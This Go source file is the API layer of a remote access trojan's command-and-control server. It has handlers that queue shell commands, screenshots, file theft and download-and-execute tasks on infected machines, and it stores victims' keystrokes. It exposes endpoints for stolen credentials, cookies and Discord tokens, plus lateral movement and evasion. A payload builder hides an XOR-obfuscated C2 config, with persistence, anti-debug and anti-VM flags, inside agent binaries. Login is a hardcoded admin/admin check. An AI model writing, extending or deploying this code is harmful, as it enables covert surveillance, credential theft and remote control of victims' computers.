package api

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/jmoiron/sqlx"

	"rat-c2-server/internal/agent"
	"rat-c2-server/internal/filetransfer"
	"rat-c2-server/internal/task"
	"rat-c2-server/internal/ws"
)

// db is the shared handle for handlers that need raw queries
// (e.g. screenshot download) without a dedicated manager.
var db *sqlx.DB

// SetDB wires the shared database handle. Called once at startup.
func SetDB(d *sqlx.DB) {
	db = d
}

func RegisterRoutes(r *gin.Engine, agentMgr *agent.Manager, taskQueue *task.Queue, fileMgr *filetransfer.Manager, lateralMgr interface{}, evasionMgr interface{}, wsHub *ws.Hub, config interface{}) {
	api := r.Group("/api")
	{
		// Auth
		api.POST("/auth/login", loginHandler)
		api.POST("/auth/logout", logoutHandler)

		// Agents
		api.GET("/agents", getAgentsHandler(agentMgr))
		api.GET("/agents/:id", getAgentHandler(agentMgr))
		api.DELETE("/agents/:id", deleteAgentHandler(agentMgr))
		api.PATCH("/agents/:id", updateAgentHandler(agentMgr))
		api.POST("/agents/:id/shell", executeShellHandler(taskQueue))
		api.POST("/agents/:id/screenshot", takeScreenshotHandler(taskQueue))
		api.POST("/agents/:id/sleep", sleepHandler(taskQueue))
		api.POST("/agents/:id/uninstall", uninstallHandler(taskQueue))
		api.POST("/agents/:id/update", updateAgentBinaryHandler(taskQueue))

		// Tasks
		api.GET("/agents/:id/tasks", getTasksHandler(taskQueue))
		api.GET("/tasks/:id", getTaskHandler(taskQueue))
		api.POST("/tasks/:id/cancel", cancelTaskHandler(taskQueue))

		// File Transfers
		api.GET("/agents/:id/files", getFileTransfersHandler(fileMgr))
		api.POST("/agents/:id/files/upload", uploadFileHandler(fileMgr))
		api.POST("/agents/:id/files/download", downloadFileHandler(fileMgr, taskQueue))
		api.POST("/agents/:id/files/download_exec", downloadExecHandler(fileMgr, taskQueue))
		api.GET("/agents/:id/files/list", listDirectoryHandler(fileMgr))
		api.GET("/files/:id/download", downloadStoredFileHandler(fileMgr))
		api.DELETE("/files/:id", deleteFileTransferHandler(fileMgr))

		// Payload Builder
		api.POST("/payloads/build", buildPayloadHandler(fileMgr))
		api.GET("/payloads/history", getPayloadHistoryHandler(fileMgr))
		api.GET("/payloads/:id/download", downloadPayloadHandler(fileMgr))
		api.DELETE("/payloads/:id", deletePayloadHandler(fileMgr))

		// Credentials
		api.GET("/agents/:id/credentials", getCredentialsHandler)
		api.GET("/agents/:id/cookies", getCookiesHandler)
		api.GET("/agents/:id/discord", getDiscordTokensHandler)
		api.GET("/agents/:id/keystrokes", getKeystrokesHandler)

		// Screenshots
		api.GET("/agents/:id/screenshots", getScreenshotsHandler)
		api.GET("/screenshots/:id/download", downloadScreenshotHandler)
		api.DELETE("/screenshots/:id", deleteScreenshotHandler)

		// Lateral Movement
		api.POST("/agents/:id/lateral", executeLateralHandler(lateralMgr))

		// Evasion
		api.POST("/agents/:id/evasion", executeEvasionHandler(evasionMgr))

		// Modules
		api.GET("/modules", getModulesHandler)
		api.POST("/modules/load", loadModuleHandler)
		api.POST("/modules/unload", unloadModuleHandler)
	}

	// Agent HTTP beacon endpoints (for the hardened C++ Windows agent).
	// Separate from WebSocket /ws/agent used by the Rust Linux agent.
	r.POST("/agent", agentHTTPBeaconHandler(agentMgr))
	r.POST("/beacon", agentHTTPDataTaskHandler(agentMgr))

	// Health on the public API port — Railway/Render hit this via $PORT.
	r.GET("/health", func(c *gin.Context) {
		c.String(http.StatusOK, "OK")
	})

	// Agent WS on the same public port (Railway only exposes one).
	// Path is /ws/agent so it never collides with POST /agent.
	if wsHub != nil {
		r.GET("/ws/agent", gin.WrapH(http.HandlerFunc(wsHub.HandleAgentWS)))
	}
}

func agentHTTPDataTaskHandler(agentMgr *agent.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		var msg struct {
			Type    string `json:"type"`
			HwID    string `json:"hw_id"`
			Data    string `json:"data"`
			Title   string `json:"window_title"`
		}
		if err := c.ShouldBindJSON(&msg); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON"})
			return
		}
		a, ok := agentMgr.GetByHwID(msg.HwID)
		if !ok {
			c.JSON(http.StatusNotFound, gin.H{"error": "unknown agent"})
			return
		}
		agentMgr.UpdateLastSeen(a.ID)

		switch msg.Type {
		case "keystrokes":
			if db == nil {
				log.Printf("[Beacon] db is nil — dropping keystrokes from %s", a.ID)
			} else {
				res, err := db.Exec(`INSERT INTO keystrokes (agent_id, window_title, keys) VALUES (?, ?, ?)`,
					a.ID, msg.Title, msg.Data)
				if err != nil {
					log.Printf("[Beacon] keystroke insert: %v", err)
				} else {
					if aff, _ := res.RowsAffected(); aff == 0 {
						log.Printf("[Beacon] keystroke insert affected=0 agent=%s", a.ID)
					}
				}
			}
		default:
			// unknown data type — accepted, ignored
		}
		c.JSON(http.StatusOK, gin.H{"status": "ok"})
	}
}

func loginHandler(c *gin.Context) {
	var req struct {
		Username string `json:"username" binding:"required"`
		Password string `json:"password" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// TODO: Implement proper authentication
	if req.Username == "admin" && req.Password == "admin" {
		token := uuid.New().String()
		c.JSON(http.StatusOK, gin.H{
			"token": token,
			"user":  gin.H{"username": req.Username},
		})
		return
	}

	c.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid credentials"})
}

func logoutHandler(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"message": "Logged out"})
}

func getAgentsHandler(agentMgr *agent.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		agents := agentMgr.List()
		c.JSON(http.StatusOK, agents)
	}
}

func getAgentHandler(agentMgr *agent.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		a, ok := agentMgr.Get(id)
		if !ok {
			c.JSON(http.StatusNotFound, gin.H{"error": "Agent not found"})
			return
		}
		c.JSON(http.StatusOK, a)
	}
}

func deleteAgentHandler(agentMgr *agent.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		agentMgr.Remove(id)
		c.JSON(http.StatusOK, gin.H{"message": "Agent removed"})
	}
}

func updateAgentHandler(agentMgr *agent.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		var updates map[string]interface{}
		if err := c.ShouldBindJSON(&updates); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}
		a, ok := agentMgr.Get(id)
		if !ok {
			c.JSON(http.StatusNotFound, gin.H{"error": "Agent not found"})
			return
		}
		// Apply updates (simplified)
		c.JSON(http.StatusOK, a)
	}
}

func executeShellHandler(taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		var req struct {
			Command string `json:"command" binding:"required"`
		}
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}
		t, _ := taskQueue.EnqueueShell(agentID, req.Command, 0)
		c.JSON(http.StatusOK, t)
	}
}

func takeScreenshotHandler(taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		t, _ := taskQueue.EnqueueScreenshot(agentID, 0)
		c.JSON(http.StatusOK, t)
	}
}

func sleepHandler(taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		var req struct {
			Seconds int `json:"seconds" binding:"required"`
		}
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}
		t, _ := taskQueue.EnqueueSleep(agentID, req.Seconds, 0)
		c.JSON(http.StatusOK, t)
	}
}

func uninstallHandler(taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		t, _ := taskQueue.EnqueueUninstall(agentID, 0)
		c.JSON(http.StatusOK, t)
	}
}

func updateAgentBinaryHandler(taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		var req struct {
			URL string `json:"url" binding:"required"`
		}
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}
		t, _ := taskQueue.EnqueueUpdate(agentID, req.URL, 0)
		c.JSON(http.StatusOK, t)
	}
}

func getTasksHandler(taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		tasks, err := taskQueue.GetByAgent(agentID, 100)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, tasks)
	}
}

func getTaskHandler(taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		t, err := taskQueue.Get(id)
		if err != nil {
			c.JSON(http.StatusNotFound, gin.H{"error": "Task not found"})
			return
		}
		c.JSON(http.StatusOK, t)
	}
}

func cancelTaskHandler(taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		taskQueue.Cancel(id)
		c.JSON(http.StatusOK, gin.H{"message": "Task cancelled"})
	}
}

func getFileTransfersHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		transfers, err := fileMgr.GetByAgent(agentID)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, transfers)
	}
}

func uploadFileHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		file, err := c.FormFile("file")
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "No file uploaded"})
			return
		}
		remotePath := c.PostForm("remote_path")
		if remotePath == "" {
			remotePath = file.Filename
		}

		src, err := file.Open()
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to open uploaded file"})
			return
		}
		defer src.Close()

		ft, err := fileMgr.CreateUpload(agentID, file.Filename, remotePath, file.Size)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}

		dst, err := os.Create(ft.TempPath)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create temp file"})
			return
		}
		defer dst.Close()

		written, err := io.Copy(dst, src)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to write file"})
			return
		}

		ft.Size = written
		ft.Status = "completed"
		now := time.Now()
		ft.CompletedAt = &now

		// Update in database
		fileMgr.GetDB().Exec(`UPDATE files SET size = ?, status = ?, completed_at = ? WHERE id = ?`, ft.Size, ft.Status, ft.CompletedAt, ft.ID)

		c.JSON(http.StatusOK, ft)
	}
}

func downloadFileHandler(fileMgr *filetransfer.Manager, taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		var req struct {
			RemotePath string `json:"remote_path" binding:"required"`
		}
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}

		ft, err := fileMgr.CreateDownload(agentID, req.RemotePath, req.RemotePath)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}

		t, err := taskQueue.EnqueueDownload(agentID, req.RemotePath, ft.TempPath, 10)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}

		c.JSON(http.StatusOK, gin.H{
			"file_transfer": ft,
			"task":          t,
		})
	}
}

func downloadExecHandler(fileMgr *filetransfer.Manager, taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		var req struct {
			URL  string `json:"url" binding:"required"`
			Args string `json:"args"`
		}
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}

		ft, err := fileMgr.CreateDownloadExec(agentID, req.URL, req.Args)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}

		t, err := taskQueue.EnqueueDownloadExec(agentID, req.URL, req.Args, 10)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}

		log.Printf("[API] Created download_exec task for agent %s: %s -> %s", agentID, req.URL, ft.TempPath)

		c.JSON(http.StatusOK, gin.H{
			"file_transfer": ft,
			"task":          t,
		})
	}
}

func listDirectoryHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		path := c.DefaultQuery("path", "C:\\")
		entries, err := fileMgr.ListDirectory(agentID, path)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, entries)
	}
}

func downloadStoredFileHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		ft, err := fileMgr.Get(id)
		if err != nil {
			c.JSON(http.StatusNotFound, gin.H{"error": "File not found"})
			return
		}

		c.Header("Content-Description", "File Transfer")
		c.Header("Content-Transfer-Encoding", "binary")
		c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", ft.Filename))
		c.Header("Content-Type", "application/octet-stream")
		c.File(ft.TempPath)
	}
}

func deleteFileTransferHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		fileMgr.Delete(id)
		c.JSON(http.StatusOK, gin.H{"message": "File transfer deleted"})
	}
}

func getCredentialsHandler(c *gin.Context) {
	c.JSON(http.StatusOK, []interface{}{})
}

func getCookiesHandler(c *gin.Context) {
	c.JSON(http.StatusOK, []interface{}{})
}

func getDiscordTokensHandler(c *gin.Context) {
	c.JSON(http.StatusOK, []interface{}{})
}

func getKeystrokesHandler(c *gin.Context) {
	agentID := c.Param("id")
	if db == nil {
		c.JSON(http.StatusOK, []interface{}{})
		return
	}
	type KS struct {
		ID        int64  `json:"id" db:"id"`
		Window    string `json:"window_title" db:"window_title"`
		Keys      string `json:"keys" db:"keys"`
		CreatedAt string `json:"created_at" db:"timestamp"`
	}
	var rows []KS
	err := db.Select(&rows, `SELECT id, window_title, keys, timestamp FROM keystrokes WHERE agent_id = ? ORDER BY timestamp DESC LIMIT 500`, agentID)
	if err != nil {
		log.Printf("[api] keystrokes select: %v", err)
		c.JSON(http.StatusOK, []interface{}{})
		return
	}
	c.JSON(http.StatusOK, rows)
}

func getScreenshotsHandler(c *gin.Context) {
	c.JSON(http.StatusOK, []interface{}{})
}

func downloadScreenshotHandler(c *gin.Context) {
	id := c.Param("id")
	var shot struct {
		Filename string `db:"filename"`
		FilePath string `db:"file_path"`
	}
	err := db.Get(&shot, "SELECT filename, file_path FROM screenshots WHERE id = ?", id)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Screenshot not found"})
		return
	}

	path := shot.FilePath
	if path == "" {
		// Fallback: derive from configured storage root
		path = filepath.Join("data", "screenshots", id+".png")
	}
	if _, statErr := os.Stat(path); os.IsNotExist(statErr) {
		c.JSON(http.StatusNotFound, gin.H{"error": "Screenshot file not found on disk"})
		return
	}

	fn := shot.Filename
	if fn == "" {
		fn = id + ".png"
	}
	c.Header("Content-Description", "File Transfer")
	c.Header("Content-Transfer-Encoding", "binary")
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", fn))
	c.Header("Content-Type", "image/png")
	c.File(path)
}

func deleteScreenshotHandler(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"message": "Screenshot deleted"})
}

func executeLateralHandler(lateralMgr interface{}) gin.HandlerFunc {
	return func(c *gin.Context) {
		var req struct {
			Technique string                 `json:"technique" binding:"required"`
			Target    string                 `json:"target" binding:"required"`
			Options   map[string]interface{} `json:"options"`
		}
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, gin.H{"message": "Lateral movement task created"})
	}
}

func executeEvasionHandler(evasionMgr interface{}) gin.HandlerFunc {
	return func(c *gin.Context) {
		var req struct {
			Technique string                 `json:"technique" binding:"required"`
			Options   map[string]interface{} `json:"options"`
		}
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, gin.H{"message": "Evasion task created"})
	}
}

func getModulesHandler(c *gin.Context) {
	c.JSON(http.StatusOK, []interface{}{})
}

func loadModuleHandler(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"message": "Module loaded"})
}

func unloadModuleHandler(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"message": "Module unloaded"})
}

// Payload Builder handlers
type PayloadRecord struct {
	ID        string    `json:"id" db:"id"`
	Filename  string    `json:"filename" db:"filename"`
	Size      int64     `json:"size" db:"size"`
	Status    string    `json:"status" db:"status"`
	CreatedAt time.Time `json:"created_at" db:"created_at"`
	TempPath  string    `json:"-" db:"temp_path"`
	Config    string    `json:"config" db:"config"`
}

func buildPayloadHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		err := c.Request.ParseMultipartForm(300 << 20) // 300MB max
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Failed to parse form"})
			return
		}

		file, header, err := c.Request.FormFile("binary")
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "No binary file provided"})
			return
		}
		defer file.Close()

		// Support both Windows EXE and Linux ELF
		filename := strings.ToLower(header.Filename)
		isWindows := strings.HasSuffix(filename, ".exe")
		isLinux := isELF(filename) || isELFFile(file)
		if !isWindows && !isLinux {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Only .exe (Windows) or ELF (Linux) files are supported"})
			return
		}

		// Parse config from form
		cfg := PayloadConfig{
			C2Host:        c.PostForm("c2_host"),
			C2Port:        c.PostForm("c2_port"),
			UseTLS:        c.PostForm("use_tls") == "true",
			Key:           c.PostForm("key"),
			HMACKey:       c.PostForm("hmac_key"),
			SleepInterval: parseInt(c.PostForm("sleep_interval"), 60),
			Jitter:        parseInt(c.PostForm("jitter"), 10),
			Persistence:   c.PostForm("persistence") == "true",
			HideConsole:   c.PostForm("hide_console") == "true",
			AntiDebug:     c.PostForm("anti_debug") == "true",
			AntiVM:        c.PostForm("anti_vm") == "true",
			InjectionMethod: c.PostForm("injection_method"),
			Platform:      c.PostForm("platform"),
		}

		// Default platform to windows if not specified
		if cfg.Platform == "" {
			cfg.Platform = "windows"
		}

		isLinux = cfg.Platform == "linux"

		if cfg.C2Host == "" {
			c.JSON(http.StatusBadRequest, gin.H{"error": "C2 host is required"})
			return
		}

		// Create payload record
		payloadID := uuid.New().String()
		ext := ".exe"
		if isLinux {
			ext = ""
		}
		tempPath := filepath.Join(fileMgr.GetStoragePath(), "payloads", payloadID+ext)

		if err := os.MkdirAll(filepath.Dir(tempPath), 0755); err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create payload directory"})
			return
		}

		// Read the uploaded binary into memory so we can inject the C2 config trailer.
		exeBytes, err := io.ReadAll(file)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to read binary"})
			return
		}

		// Serialize the operator C2 config and append it as an obfuscated trailer.
		// Loader contract: scan for magic "RATC2CFG" XOR 0x33, next 4 bytes =
		// uint32 LE length, then that many bytes of rolling-XOR JSON:
		// body[i] = json[i] ^ (0x5A + (12+i)). Agent mirrors this exactly.
		configJSON, err := json.Marshal(cfg)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to encode config"})
			return
		}
		var lenBuf [4]byte
		binary.LittleEndian.PutUint32(lenBuf[:], uint32(len(configJSON)))
		magic := []byte{0x61, 0x72, 0x67, 0x70, 0x01, 0x70, 0x75, 0x74} // "RATC2CFG"^0x33
		enc := make([]byte, len(configJSON))
		for i, b := range configJSON {
			enc[i] = b ^ byte(0x5A+(12+i))
		}
		trailer := append(append(magic, lenBuf[:]...), enc...)
		patched := append(exeBytes, trailer...)

		if err := os.WriteFile(tempPath, patched, 0644); err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to write patched binary"})
			return
		}
		written := int64(len(patched))

		// Store in database
		_, err = fileMgr.GetDB().Exec(`
			INSERT INTO payloads (id, filename, size, status, temp_path, config, created_at)
			VALUES (?, ?, ?, 'completed', ?, ?, ?)
		`, payloadID, header.Filename, written, tempPath, string(configJSON), time.Now())

		if err != nil {
			log.Printf("[Payload] DB insert error: %v", err)
		}

		log.Printf("[Payload] Built payload %s: %s (%d bytes)", payloadID, header.Filename, written)

		c.JSON(http.StatusOK, gin.H{
			"id":       payloadID,
			"filename": header.Filename,
			"url":      fmt.Sprintf("/api/payloads/%s/download", payloadID),
		})
	}
}

type PayloadConfig struct {
	C2Host         string `json:"c2_host"`
	C2Port         string `json:"c2_port"`
	UseTLS         bool   `json:"use_tls"`
	Key            string `json:"key"`
	HMACKey        string `json:"hmac_key"`
	SleepInterval  int    `json:"sleep_interval"`
	Jitter         int    `json:"jitter"`
	Persistence    bool   `json:"persistence"`
	HideConsole    bool   `json:"hide_console"`
	AntiDebug      bool   `json:"anti_debug"`
	AntiVM         bool   `json:"anti_vm"`
	InjectionMethod string `json:"injection_method"`
	Platform       string `json:"platform"` // "windows" or "linux"
}

func parseInt(s string, defaultVal int) int {
	if s == "" {
		return defaultVal
	}
	val, err := strconv.Atoi(s)
	if err != nil {
		return defaultVal
	}
	return val
}

// isELF checks if a filename suggests an ELF binary
func isELF(filename string) bool {
	// Common Linux binary extensions / no extension
	lower := strings.ToLower(filename)
	return strings.HasSuffix(lower, ".elf") ||
		strings.HasSuffix(lower, ".bin") ||
		strings.HasSuffix(lower, ".out") ||
		!strings.Contains(lower, ".") // no extension often means ELF on Linux
}

// isELFFile reads the first 4 bytes to check for ELF magic
func isELFFile(file io.ReaderAt) bool {
	header := make([]byte, 4)
	n, err := file.ReadAt(header, 0)
	if err != nil || n < 4 {
		return false
	}
	return string(header) == "\x7fELF"
}

func getPayloadHistoryHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		var payloads []PayloadRecord
		err := fileMgr.GetDB().Select(&payloads, `
			SELECT id, filename, size, status, created_at, temp_path, config
			FROM payloads
			ORDER BY created_at DESC
			LIMIT 100
		`)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, payloads)
	}
}

func downloadPayloadHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		var payload PayloadRecord
		err := fileMgr.GetDB().Get(&payload, "SELECT * FROM payloads WHERE id = ?", id)
		if err != nil {
			c.JSON(http.StatusNotFound, gin.H{"error": "Payload not found"})
			return
		}

		if _, err := os.Stat(payload.TempPath); os.IsNotExist(err) {
			c.JSON(http.StatusNotFound, gin.H{"error": "Payload file not found on disk"})
			return
		}

		c.Header("Content-Description", "File Transfer")
		c.Header("Content-Transfer-Encoding", "binary")
		c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", payload.Filename))
		c.Header("Content-Type", "application/octet-stream")
		c.Header("Content-Length", strconv.FormatInt(payload.Size, 10))
		c.File(payload.TempPath)
	}
}

func deletePayloadHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		var payload PayloadRecord
		err := fileMgr.GetDB().Get(&payload, "SELECT * FROM payloads WHERE id = ?", id)
		if err != nil {
			c.JSON(http.StatusNotFound, gin.H{"error": "Payload not found"})
			return
		}

		// Delete file from disk
		os.Remove(payload.TempPath)

		// Delete from database
		_, err = fileMgr.GetDB().Exec("DELETE FROM payloads WHERE id = ?", id)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}

		c.JSON(http.StatusOK, gin.H{"message": "Payload deleted"})
	}
}

func startAgentPayloadServer(fileMgr *filetransfer.Manager, port int) {
	mux := http.NewServeMux()

	mux.HandleFunc("/payload/", func(w http.ResponseWriter, r *http.Request) {
		fileID := r.URL.Path[len("/payload/"):]
		if fileID == "" {
			http.NotFound(w, r)
			return
		}

		ft, err := fileMgr.Get(fileID)
		if err != nil {
			log.Printf("[Payload] File not found: %s", fileID)
			http.NotFound(w, r)
			return
		}

		w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%s", ft.Filename))
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Length", strconv.FormatInt(ft.Size, 10))
		http.ServeFile(w, r, ft.TempPath)
	})

	log.Printf("[*] Payload server listening on :%d", port)
	http.ListenAndServe(fmt.Sprintf(":%d", port), mux)
}

func ServeAgentBinary(fileMgr *filetransfer.Manager, bindAddr string, binaryPath string) {
	mux := http.NewServeMux()

	mux.HandleFunc("/agent", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("[AgentBinary] Request: %s, Path: %s", r.URL.Path, binaryPath)
		if _, err := os.Stat(binaryPath); os.IsNotExist(err) {
			log.Printf("[AgentBinary] File not found: %s", binaryPath)
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Disposition", "attachment; filename=agent.exe")
		http.ServeFile(w, r, binaryPath)
	})

	// Also serve Linux agent at /agent/linux
	linuxPath := filepath.Join(filepath.Dir(binaryPath), "agent_linux")
	mux.HandleFunc("/agent/linux", func(w http.ResponseWriter, r *http.Request) {
		if _, err := os.Stat(linuxPath); os.IsNotExist(err) {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Disposition", "attachment; filename=agent_linux")
		http.ServeFile(w, r, linuxPath)
	})

	log.Printf("[*] Agent binary server listening on %s", bindAddr)
	http.ListenAndServe(bindAddr, mux)
}

func agentHTTPBeaconHandler(agentMgr *agent.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		if c.Request.Method != http.MethodPost {
			c.JSON(http.StatusMethodNotAllowed, gin.H{"error": "POST required"})
			return
		}

		var reg agent.RegistrationData
		if err := c.ShouldBindJSON(&reg); err != nil {
			log.Printf("[AgentHTTP] Invalid JSON: %v", err)
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON body"})
			return
		}

		// Get client IP
		ip := c.ClientIP()
		if ip == "::1" || ip == "127.0.0.1" {
			// Try to get real IP from headers
			if xff := c.GetHeader("X-Forwarded-For"); xff != "" {
				ip = strings.Split(xff, ",")[0]
			} else if xri := c.GetHeader("X-Real-IP"); xri != "" {
				ip = xri
			}
		}

		// Register or reconnect agent
		agt, err := agentMgr.Register(&reg, nil, ip)
		if err != nil {
			log.Printf("[AgentHTTP] Register failed: %v", err)
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Registration failed"})
			return
		}

		log.Printf("[AgentHTTP] Agent registered: %s (%s) from %s", agt.ID, agt.Hostname, ip)

		// Return agent ID and session ID for the agent to use
		c.JSON(http.StatusOK, gin.H{
			"agent_id":   agt.ID,
			"session_id": agt.SessionID,
			"status":     "registered",
		})
	}
}